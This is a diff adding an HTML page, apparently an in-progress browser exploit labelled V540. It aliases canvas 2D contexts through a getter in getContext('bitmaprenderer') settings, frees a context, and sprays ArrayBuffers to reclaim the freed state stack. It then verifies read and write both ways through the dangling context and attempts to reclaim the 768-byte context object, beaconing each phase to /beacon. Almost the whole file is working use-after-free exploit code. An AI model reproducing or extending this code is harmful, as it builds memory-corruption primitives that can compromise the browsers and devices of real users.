@@ -1,0 +1,316 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>V540</title>
+<style>body{font:11px monospace;background:#111;color:#0f0;margin:8px}
+#log{white-space:pre-wrap;word-break:break-all}</style>
+</head><body>
+<div id="log">V540 — stateStack sweep (6K-10K) + context 768B reclaim
+Loading...</div>
+<script>
+var L=document.getElementById('log');
+function log(m){L.textContent+='\n'+m}
+var T0=Date.now();
+function B(tag,body){
+  var msg='['+(Date.now()-T0)+'ms] '+(body||'');
+  log('>> '+tag+': '+msg);
+  try{var x=new XMLHttpRequest();x.open('POST','/beacon/V540-'+tag,false);
+  x.setRequestHeader('Content-Type','text/plain');x.send(msg)}catch(e){}
+}
+window.onerror=function(m,s,l,c,e){B('ONERROR',m+' at '+s+':'+l+':'+c)};
+B('BOOT',navigator.userAgent);
+
+var dangling, official, officialCanvas;
+var PHASE = 0;
+var MARKER = 12345.6789;
+
+// Pre-allocate storage to avoid polluting target size classes
+var stateHitSize = 0;
+var ctxReclaimed = false;
+var sprayStorage = [];
+
+// P1: Create aliased pair
+setTimeout(function(){
+  try {
+    B('P1-START','aliased pair');
+    var c = document.createElement('canvas');
+    c.width = 1; c.height = 1;
+    var inner = null;
+    var s = {};
+    Object.defineProperty(s, 'alpha', {
+      get: function() { inner = c.getContext('2d'); return true; }
+    });
+    c.getContext('bitmaprenderer', s);
+    if (!inner) { B('P1-FAIL','no inner'); return; }
+
+    var ctxs = [];
+    for (var i = 0; i < 200; i++) {
+      var nc = document.createElement('canvas');
+      nc.width = 1; nc.height = 1;
+      var nctx = nc.getContext('2d');
+      nctx.lineWidth = 200 + i;
+      ctxs.push({canvas: nc, ctx: nctx});
+    }
+
+    var dlw = inner.lineWidth;
+    if (dlw >= 200 && dlw < 400) {
+      var idx = dlw - 200;
+      dangling = inner;
+      official = ctxs[idx].ctx;
+      officialCanvas = ctxs[idx].canvas;
+      window._ctxs = ctxs;
+      B('P1-OK','aliased at #'+idx);
+      PHASE = 1;
+    } else { B('P1-MISS','lw='+dlw); }
+  } catch(e) { B('P1-ERR',''+e); }
+}, 200);
+
+// P2: Grow stateStack, set marker, free context
+setTimeout(function(){
+  if (PHASE < 1) return;
+  try {
+    B('P2-START','setup + free');
+    official.lineWidth = MARKER;
+    official.save();
+    var rlw = official.lineWidth; // realize saves
+    B('P2-REALIZED','lw='+rlw);
+
+    // Free context
+    var s2 = {};
+    Object.defineProperty(s2, 'alpha', { get: function() { return true; } });
+    officialCanvas.getContext('bitmaprenderer', s2);
+    B('P2-FREED','done');
+
+    // Verify read from freed memory
+    var lw = dangling.lineWidth;
+    B('P2-CHECK','freed lw='+lw);
+    if (lw === MARKER) PHASE = 2;
+    else B('P2-WARN','unexpected lw='+lw);
+  } catch(e) { B('P2-ERR',''+e); }
+}, 1500);
+
+// P3: Wide stateStack buffer sweep (16 * sizeof(State))
+// sizeof(State) estimated 480-560B → buffer = 7680-8960B
+// Sweep 6144-12288 in 128B steps to be thorough
+setTimeout(function(){
+  if (PHASE < 2) return;
+  try {
+    B('P3-START','stateStack sweep 6144-12288 step=128');
+    var hitSz = 0;
+
+    for (var sz = 6144; sz <= 12288; sz += 128) {
+      var batch = [];
+      for (var j = 0; j < 50; j++) {
+        var ab = new ArrayBuffer(sz);
+        var dv = new DataView(ab);
+        // Fill with size-encoded pattern: each 8B = float64 of (sz + offset/8 * 0.001)
+        for (var k = 0; k < sz; k += 8) {
+          dv.setFloat64(k, sz + (k/8) * 0.001, true);
+        }
+        batch.push({ab: ab, dv: dv});
+      }
+      sprayStorage.push(batch);
+
+      // Check if lineWidth changed
+      var lw = dangling.lineWidth;
+      if (lw !== MARKER) {
+        hitSz = sz;
+        B('P3-HIT','SIZE='+sz+' lw='+lw);
+        stateHitSize = sz;
+
+        // Read more state to map offsets
+        try {
+          var ga = dangling.globalAlpha;
+          var ml = dangling.miterLimit;
+          var ldo = dangling.lineDashOffset;
+          B('P3-STATE','ga='+ga+' ml='+ml+' ldo='+ldo);
+        } catch(e2) { B('P3-STATE-ERR',''+e2); }
+
+        // Read transform
+        try {
+          var t = dangling.getTransform();
+          B('P3-TX','a='+t.a+' b='+t.b+' c='+t.c+' d='+t.d+' e='+t.e+' f='+t.f);
+        } catch(e3) { B('P3-TX-ERR',''+e3); }
+        break;
+      }
+
+      if (sz % 1024 === 0) B('P3-SWEEP','through '+sz+' lw='+lw);
+    }
+
+    if (!hitSz) {
+      B('P3-MISS','no hit in 6144-12288');
+      // Extended sweep: try larger sizes
+      for (var sz2 = 12288; sz2 <= 20480; sz2 += 256) {
+        var batch2 = [];
+        for (var j2 = 0; j2 < 30; j2++) {
+          var ab2 = new ArrayBuffer(sz2);
+          var dv2 = new DataView(ab2);
+          for (var k2 = 0; k2 < sz2; k2 += 8) {
+            dv2.setFloat64(k2, sz2 + (k2/8) * 0.001, true);
+          }
+          batch2.push({ab: ab2, dv: dv2});
+        }
+        sprayStorage.push(batch2);
+
+        var lw2 = dangling.lineWidth;
+        if (lw2 !== MARKER) {
+          B('P3-HIT-EXT','SIZE='+sz2+' lw='+lw2);
+          stateHitSize = sz2;
+          break;
+        }
+        if (sz2 % 2048 === 0) B('P3-EXT-SWEEP','through '+sz2+' lw='+lw2);
+      }
+    }
+
+    PHASE = 3;
+  } catch(e) { B('P3-ERR',''+e); }
+}, 3000);
+
+// P4: If stateStack hit, do bidirectional R/W test
+setTimeout(function(){
+  if (PHASE < 3) return;
+  if (!stateHitSize) { B('P4-SKIP','no stateStack hit'); PHASE = 4; return; }
+  try {
+    B('P4-START','bidirectional R/W test, hitSize='+stateHitSize);
+
+    // Write a distinctive double through dangling
+    dangling.lineWidth = 99999.12345;
+    B('P4-WROTE','lineWidth=99999.12345');
+
+    // Now scan ALL ABs of the hit size to find which one contains our value
+    var found = false;
+    for (var i = 0; i < sprayStorage.length && !found; i++) {
+      var batch = sprayStorage[i];
+      if (!batch || !batch.length) continue;
+      if (batch[0].ab.byteLength !== stateHitSize) continue;
+
+      for (var j = 0; j < batch.length && !found; j++) {
+        var dv = batch[j].dv;
+        // Scan for our double value (IEEE754 of 99999.12345)
+        for (var off = 0; off < stateHitSize - 7; off += 8) {
+          var val = dv.getFloat64(off, true);
+          if (val === 99999.12345) {
+            found = true;
+            B('P4-FOUND','AB['+i+']['+j+'] offset='+off+' contains our lineWidth!');
+
+            // Read surrounding bytes
+            var hex = '';
+            var start = Math.max(0, off - 32);
+            var end = Math.min(stateHitSize, off + 40);
+            for (var b = start; b < end; b++) {
+              var byte = dv.getUint8(b);
+              hex += (byte < 16 ? '0' : '') + byte.toString(16) + ' ';
+            }
+            B('P4-HEX','around offset '+off+': '+hex);
+
+            // Write through AB, read through dangling
+            dv.setFloat64(off, 77777.54321, true);
+            var readBack = dangling.lineWidth;
+            B('P4-REVERSE','wrote 77777.54321 via AB, dangling reads: '+readBack);
+
+            // Write through dangling, verify in AB
+            dangling.lineWidth = 88888.11111;
+            var abRead = dv.getFloat64(off, true);
+            B('P4-CONFIRM','wrote 88888.11111 via dangling, AB reads: '+abRead);
+
+            break;
+          }
+        }
+      }
+    }
+
+    if (!found) B('P4-NOTFOUND','could not find lineWidth value in any AB');
+    PHASE = 4;
+  } catch(e) { B('P4-ERR',''+e); }
+}, 8000);
+
+// P5: Try reclaiming the 768B context object itself with AB(768)
+// Use getContextAttributes() as safe oracle (reads m_settings, no pointer deref)
+setTimeout(function(){
+  if (PHASE < 4) return;
+  try {
+    B('P5-START','768B context reclaim attempt');
+
+    // First check getContextAttributes on normal context for baseline
+    // (dangling still works even if stateStack was reclaimed)
+    var baseline = null;
+    try {
+      baseline = dangling.getContextAttributes();
+      B('P5-BASELINE','attrs: alpha='+baseline.alpha+' desync='+(baseline.desynchronized||'undef')+' colorSpace='+(baseline.colorSpace||'undef'));
+    } catch(e) {
+      B('P5-BASELINE-ERR',''+e);
+    }
+
+    // Spray AB(768) with distinctive pattern
+    // Fill first 256 bytes with 0x01 pattern, rest with 0x42
+    var ctx768spray = [];
+    for (var i = 0; i < 200; i++) {
+      var ab = new ArrayBuffer(768);
+      var u8 = new Uint8Array(ab);
+      // Fill with 0x41 (recognizable but not null)
+      for (var k = 0; k < 768; k++) u8[k] = 0x41;
+      ctx768spray.push({ab: ab, u8: u8, dv: new DataView(ab)});
+    }
+
+    // Check getContextAttributes again — if reclaimed, values will be from our AB data
+    try {
+      var after = dangling.getContextAttributes();
+      B('P5-AFTER','attrs: alpha='+after.alpha+' desync='+(after.desynchronized||'undef')+' colorSpace='+(after.colorSpace||'undef'));
+
+      if (baseline && after.alpha !== baseline.alpha) {
+        B('P5-RECLAIMED','context object reclaimed! alpha changed from '+baseline.alpha+' to '+after.alpha);
+        ctxReclaimed = true;
+      } else if (baseline && (after.desynchronized !== baseline.desynchronized)) {
+        B('P5-RECLAIMED','context object reclaimed! desync changed');
+        ctxReclaimed = true;
+      } else {
+        B('P5-NOCHANGE','getContextAttributes unchanged');
+      }
+    } catch(e) {
+      B('P5-CRASH','getContextAttributes crashed after spray: '+e);
+      // Crash might mean we overwrote vtable or other critical field
+    }
+
+    // Try lineWidth — if context reclaimed, this follows our AB data as m_stateStack
+    // Could crash if m_buffer pointer (from AB 0x41 bytes) is invalid
+    try {
+      var lw = dangling.lineWidth;
+      B('P5-LW','lineWidth after 768B spray: '+lw);
+    } catch(e) {
+      B('P5-LW-CRASH','lineWidth crashed: '+e+' (context reclaimed, invalid m_buffer)');
+    }
+
+    window._ctx768 = ctx768spray;
+    PHASE = 5;
+  } catch(e) { B('P5-ERR',''+e); }
+}, 12000);
+
+// P6: If context reclaimed, try to identify which AB got the slot
+setTimeout(function(){
+  if (PHASE < 5) return;
+  if (!ctxReclaimed) { B('P6-SKIP','context not reclaimed'); return; }
+  try {
+    B('P6-START','finding which AB reclaimed context');
+
+    // Write unique pattern through dangling (writes to context object)
+    // setLineWidth writes to State in stateStack, NOT to context object directly
+    // We need something that writes TO the context object itself
+
+    // getLineDash() returns a copy, setLineDash writes to state not context
+    // Actually, most canvas ops write to the stateStack, not the context object
+
+    // Let's try the reverse: write through AB, check if dangling sees it
+    var spray = window._ctx768;
+    for (var i = 0; i < spray.length; i++) {
+      // Write a unique marker in each AB at a candidate offset
+      spray[i].dv.setFloat64(0, 11111 + i, true);
+    }
+
+    // Now read something from dangling that comes from the context object
+    // Not stateStack — we need something in the first ~200 bytes of the 768B object
+    // Unfortunately most readable fields are in stateStack...
+
+    B('P6-DONE','marker pattern written to all 768B ABs');
+  } catch(e) { B('P6-ERR',''+e); }
+}, 15000);
+
+setTimeout(function(){B('COMPLETE','all done')},18000);
+</script></body></html>
